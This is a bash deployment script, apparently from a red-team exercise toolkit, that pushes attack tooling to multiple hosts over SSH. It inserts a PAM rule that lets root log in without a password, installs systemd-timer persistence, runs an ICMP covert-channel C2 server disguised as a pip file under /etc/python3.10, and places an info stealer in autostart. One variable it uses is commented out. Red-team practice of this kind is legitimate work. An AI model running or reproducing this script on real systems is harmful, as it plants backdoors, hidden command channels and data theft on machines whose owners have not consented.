#!/bin/bash
set -e 
CONFIG="passwordAuth.yaml"


multissh -c "${CONFIG}" run "sudo sed -i '1s/^/auth sufficient pam_succeed_if.so user = root\n/' /etc/pam.d/common-auth"

bash ./deploy_tool.sh "${CONFIG}" daemon.d/ /lib/gnupg2 ./LetTheGamesBegin.sh

# SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
# Deploying Jack's SystemdTimer persistence
bash ./deploy_tool.sh "${CONFIG}" ../../CDT-Red-Team-Tools/SystemdTimer-LinuxPersistenceStash/ /media "./install.sh --purge-source"

# Deploying Jeans C2
multissh -c "${CONFIG}" upload --sudo "${SCRIPT_DIR}"CDT-Red-Team-Tools/Covert Channel/icmp_server.py "/etc/python3.10/pip_connectivity.py"
multissh -c "${CONFIG}" run "chmod +x /etc/python3.10/pip_connectivity.py"
multissh -c "${CONFIG}" run "sudo python3 /etc/python3.10/pip_connectivity.py"



# Deploying Will's info stealer
bash ./deploy_tool.sh "${CONFIG}" "../../CDT-Red-Team-Tools/Info Gathering/" /etc/xdg/autostart "sudo python3 FullInfoScan.py"
